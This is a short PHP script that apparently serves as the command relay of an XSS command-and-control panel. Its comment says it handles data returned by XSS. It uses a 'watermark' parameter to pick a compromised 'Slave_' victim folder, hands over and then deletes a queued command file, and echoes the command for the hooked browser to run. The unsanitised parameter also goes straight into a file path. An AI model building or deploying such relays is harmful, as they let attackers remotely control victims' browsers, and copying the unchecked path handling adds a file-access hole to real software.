<?php
//$cmd = getenv('QUERY_STRING');  // XSS传回的数据
//header('Content-Type: application/javascript');
$watermarknum = "Slave_".$_GET['watermark'];

if ($watermarknum == "null"){
	$watermarknum = "Slave_noWatermark";
}

if (file_exists("slave\\$watermarknum\\realtimecmd.txt")){
    $cmd = file_get_contents("slave\\$watermarknum\\realtimecmd.txt"); 
    unlink("slave\\$watermarknum\\realtimecmd.txt");
    
    echo $cmd;
} else {
	  echo "";
}

?>
